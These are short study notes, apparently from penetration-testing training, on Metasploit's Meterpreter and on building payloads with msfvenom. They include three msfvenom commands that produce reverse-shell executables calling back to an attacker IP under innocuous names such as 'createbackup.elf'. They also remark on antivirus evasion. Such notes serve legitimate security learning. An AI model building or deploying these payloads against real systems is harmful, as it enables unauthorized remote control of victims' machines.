# Metasploit

### Meterpreter
Meterpreter is a payload that uses in-memory DLL injection to stealthfully establish a communication channel between an attack box and a target

Can use `shell` command to drop in to a system shell


### MSFvenom
Crafting payloads with msfvenom

**Staged payload**  
 When run using an exploit module in Metasploit, this payload will send a small stage that will be executed on the target and then call back to the attack box to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell.

**Stageless payload**
This payload will be sent in its entirety across a network connection without a stage. Good for low bandwith and for Evasion.

**Naming convention:**
First is staged. Second is stageless
`windows/meterpreter/reverse_tcp` and `windows/meterpreter_reverse_tcp`    

**Building Stageless Payload** 
Example:  
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf`

`.exe` for windows. Would get caught in AV since signature is known

**Meterpreter Payload**
`msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe`

**Netcat Payload**
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.0.32 LPORT=4444 -f exe -o reverse.exe`